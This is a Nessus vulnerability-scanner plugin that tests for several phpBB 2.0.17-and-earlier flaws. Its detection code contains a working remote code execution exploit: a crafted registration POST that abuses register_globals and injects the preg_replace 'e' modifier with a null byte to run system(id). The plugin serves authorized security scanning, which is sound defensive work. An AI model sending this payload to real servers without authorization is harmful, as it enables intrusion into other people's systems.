#
# (C) Tenable Network Security
#


  desc["english"] = "
Synopsis :

The remote web server contains a PHP application that is affected by
multiple vulnerabilities. 

Description :

The remote host is running a version of phpBB that, if using PHP 5
with 'register_globals' enabled, fails to properly deregister global
variables as well as to initialize several variables in various
scripts.  An attacker may be able to exploit these issues to execute
arbitrary code or to conduct SQL injection and cross-site scripting
attacks. 

See also :

http://www.hardened-php.net/advisory_172005.75.html
http://www.phpbb.com/phpBB/viewtopic.php?f=14&t=336756

Solution : 

Upgrade to phpBB version 2.0.18 or later.

Risk factor : 

High / CVSS Base Score : 7
(AV:R/AC:L/Au:NR/C:P/I:P/A:P/B:N)";


if (description) {
  script_id(20132);
  script_version("$Revision: 1.8 $");

  script_cve_id("CVE-2005-3415", "CVE-2005-3416", "CVE-2005-3417", "CVE-2005-3418", "CVE-2005-3419", "CVE-2005-3420");
  script_bugtraq_id(15243, 15246);
  if (defined_func("script_xref")) {
    script_xref(name:"OSVDB", value:"20386");
    script_xref(name:"OSVDB", value:"20387");
    script_xref(name:"OSVDB", value:"20388");
    script_xref(name:"OSVDB", value:"20389");
    script_xref(name:"OSVDB", value:"20390");
    script_xref(name:"OSVDB", value:"20391");
    script_xref(name:"OSVDB", value:"20397");
    script_xref(name:"OSVDB", value:"20413");
    script_xref(name:"OSVDB", value:"20414");
  }

  script_name(english:"phpBB <= 2.0.17 Multiple Vulnerabilities");
  script_summary(english:"Checks for multiple vulnerabilities in phpBB <= 2.0.17");

  script_description(english:desc["english"]);
 
  script_category(ACT_GATHER_INFO);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("phpbb_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/phpBB"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  ver = matches[1];
  dir = matches[2];

  # Check whether the profile.php script exists.
  req = http_get(item:string(dir, "/profile.php?mode=register"), port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # If it does...
  if ('href="profile.php?mode=register&amp;sid=' >< res) {
    # Try to exploit some of the flaws to run a command.
    exploit = "system(id)";
    postdata = string(
      "mode=register&",
      "agreed=true&",
      # nb: sets $error in "includes/usercp_register.php".
      "language=1&",
      # nb: causes array_merge() to fail in "common.php" w/ PHP5 so we avoid
      #     deregistering 'signature' and 'signature_bbcode_uid'.
      "HTTP_SESSION_VARS=1&",
      # nb: specifies our exploit.
      "signature=:", exploit, "&",
      # nb: injects the "e" modifier into preg_replace; 
      #     the null-byte requires magic_quotes to be off.
      "signature_bbcode_uid=(.*)/e%00"
    );
    req = string(
      "POST ", dir, "/profile.php?mode=register HTTP/1.1\r\n",
      "Host: ", get_host_name(), "\r\n",
      "Content-Type: application/x-www-form-urlencoded\r\n",
      "Content-Length: ", strlen(postdata), "\r\n",
      "\r\n",
      postdata
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # There's a problem if we were able to run our command.
    if (egrep(pattern:"root:.*:0:[01]:", string:res)) {
      if (report_verbosity > 0) {
        output = strstr(res, '<textarea name="signature"');
        if (output) {
          output = output - strstr(output, "</textarea>");
          output = strstr(output, ">");
          output = output - ">";
        }
        else output = res;

        report = string(
          desc["english"],
          "\n\n",
          "Plugin output :\n",
          "\n",
          output
        );
      }
      else report = desc["english"];

      security_hole(port:port, data:report);
      exit(0);
    }
  }

  # If we're being paranoid.
  if (report_paranoia > 1) {
    # Report if the version number <= 2.0.17 as the exploit might have failed.
    if (ver =~ "([01]\.|2\.0\.([0-9]($|[^0-9])|1[0-7]))") {
      report = string(
        desc["english"],
        "\n\n",
        "Plugin output :\n",
        "\n",
        "***** Nessus has determined the vulnerability exists on the remote\n",
        "***** host simply by looking at the version number of phpBB\n",
        "***** installed there.\n"
      );

      security_hole(port:port, data:report);
      exit(0);
    }
  }
}
